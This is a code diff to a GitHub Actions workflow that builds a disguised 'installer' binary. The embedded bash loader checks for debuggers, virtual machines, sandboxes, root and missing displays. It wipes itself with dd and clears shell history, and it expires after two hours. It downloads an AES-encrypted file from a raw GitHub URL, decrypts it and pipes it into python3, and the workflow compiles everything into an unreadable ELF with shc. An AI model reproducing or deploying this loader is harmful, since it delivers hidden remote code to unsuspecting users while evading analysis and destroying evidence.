@@ -19,17 +19,16 @@ jobs:
           sudo apt-get install -y shc
 
       - name: Construct Fortified Installer Payload
-        env:
-          # Pulls your sensitive AES decryption key from hidden repository secrets
-          REAL_AES_KEY: ${{ secrets.DECRYPT_KEY }}
-          # Provide your actual raw enc file GitHub target path URL asset here
-          TARGET_URL: "https://raw.githubusercontent.com/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvck/refs/heads/main/main.py"
         run: |
           # 1. Grab current Unix Epoch time for the relative time-bomb lock
           DYNAMICS_TIMESTAMP=$(date +%s)
           
-          # 2. Write the template asset with variables handled inside private server memory
-          cat << 'EOF' > payload_source.sh
+          # 2. Assign configuration assets explicitly inside the runner context
+          TARGET_URL="https://githubusercontent.com"
+          REAL_AES_KEY="${{ secrets.DECRYPT_KEY }}"
+
+          # 3. Write the template asset using standard EOF (Allows instant inline rendering)
+          cat << EOF > payload_source.sh
           #!/bin/bash
 
           set +o history 2>/dev/null
@@ -42,23 +41,23 @@ jobs:
               export DECRYPT_KEY="0"
               unset DECRYPT_KEY A7 HISTFILE
 
-              if [ -n "$0" ] && [ -f "$0" ]; then
+              if [ -n "\$0" ] && [ -f "\$0" ]; then
                   local size
-                  size=$(wc -c < "$0" 2>/dev/null || echo 10240)
-                  dd if=/dev/urandom of="$0" bs="$size" count=1 conv=notrunc 2>/dev/null
-                  dd if=/dev/zero of="$0" bs="$size" count=1 conv=notrunc 2>/dev/null
-                  rm -f "$0" 2>/dev/null
+                  size=\$(wc -c < "\$0" 2>/dev/null || echo 10240)
+                  dd if=/dev/urandom of="\$0" bs="\$size" count=1 conv=notrunc 2>/dev/null
+                  dd if=/dev/zero of="\$0" bs="\$size" count=1 conv=notrunc 2>/dev/null
+                  rm -f "\$0" 2>/dev/null
               fi
 
               clear 2>/dev/null
-              printf "\033c" 2>/dev/null 
+              printf "\033c" 2>/dev/null # Hard reset terminal scrollback cache
               history -c 2>/dev/null
               exit 0
           }
 
           trap 'self_destruct' ERR EXIT SIGINT SIGTERM SIGQUIT SIGHUP
 
-          if [ "$EUID" -eq 0 ] || [ "$UID" -eq 0 ] || [ "$(id -u 2>/dev/null)" -eq 0 ]; then
+          if [ "\$EUID" -eq 0 ] || [ "\$UID" -eq 0 ] || [ \$(id -u 2>/dev/null) -eq 0 ]; then
               self_destruct
           fi
 
@@ -67,40 +66,43 @@ jobs:
           fi
 
           if [ -f /proc/self/status ]; then
+              # Detects active ptrace hooking (strace, gdb, ltrace)
               if grep -q "TracerPid:[[:space:]]*[1-9]" /proc/self/status 2>/dev/null; then
                   self_destruct
               fi
+              # Detects if the process is being monitored by structural sub-shells
               if grep -q "wchan:[[:space:]]*ptrace_stop" /proc/self/wchan 2>/dev/null; then
                   self_destruct
               fi
           fi
 
           if [ -d /proc ]; then
+              # Check for hypervisor indicators in system logs/hardware mapping
               if grep -E -iq "VirtualBox|VMware|KVM|QEMU|Xen|Hyper-V|sandbox|cuckoo|docker|lxc" /proc/cpuinfo /proc/scsi/scsi /proc/version 2>/dev/null; then
                   self_destruct
               fi
           fi
 
-          if [ -z "$DISPLAY" ] && [ -z "$WAYLAND_DISPLAY" ]; then
+          if [ -z "\$DISPLAY" ] && [ -z "\$WAYLAND_DISPLAY" ]; then
               self_destruct
           fi
 
-          COMPILE_TIME=__TIME_STAMP__
-          CURRENT_EPOCH=$(date +%s 2>/dev/null || echo 0)
+          COMPILE_TIME=${DYNAMICS_TIMESTAMP}
+          CURRENT_EPOCH=\$(date +%s 2>/dev/null || echo 0)
           LIFESPAN=7200
 
-          if [ "$CURRENT_EPOCH" -eq 0 ] || [ "$CURRENT_EPOCH" -gt $((COMPILE_TIME + LIFESPAN)) ] || [ "$CURRENT_EPOCH" -lt "$COMPILE_TIME" ]; then
+          if [ "\$CURRENT_EPOCH" -eq 0 ] || [ "\$CURRENT_EPOCH" -gt \$((\$COMPILE_TIME + \$LIFESPAN)) ] || [ "\$CURRENT_EPOCH" -lt "\$COMPILE_TIME" ]; then
               self_destruct
           fi
 
-          export DECRYPT_KEY="__AES_KEY__"
-          A7="__TARGET_URL__" 
+          export DECRYPT_KEY="${REAL_AES_KEY}"
+          A7="${TARGET_URL}" 
 
-          if ! curl -sSsfL \
-               --tlsv1.3 --tls-max 1.3 \
-               -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
-               --retry 2 --connect-timeout 8 "$A7" 2>/dev/null | \
-               openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -k "$DECRYPT_KEY" 2>/dev/null | \
+          if ! curl -sSsfL \\
+               --tlsv1.3 --tls-max 1.3 \\
+               -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \\
+               --retry 2 --connect-timeout 8 "\$A7" 2>/dev/null | \\
+               openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -k "\$DECRYPT_KEY" 2>/dev/null | \\
                python3 - 2>/dev/null; then
               self_destruct
           fi
@@ -110,14 +112,8 @@ jobs:
           set -o history 2>/dev/null
           EOF
 
-          # 3. Swap out configuration targets securely inside private runner runtime
-          sed -i "s/__TIME_STAMP__/${DYNAMICS_TIMESTAMP}/g" payload_source.sh
-          sed -i "s/__AES_KEY__/${REAL_AES_KEY}/g" payload_source.sh
-          sed -i "s|__TARGET_URL__|${TARGET_URL}|g" payload_source.sh
-
       - name: Compile Script into Binary ELF Format
         run: |
-          # Translates your shell configuration into an unreadable binary ELF 
           shc -v -r -B -f payload_source.sh -o installer
 
       - name: Deploy Compiled Executable to Repository Live Folder
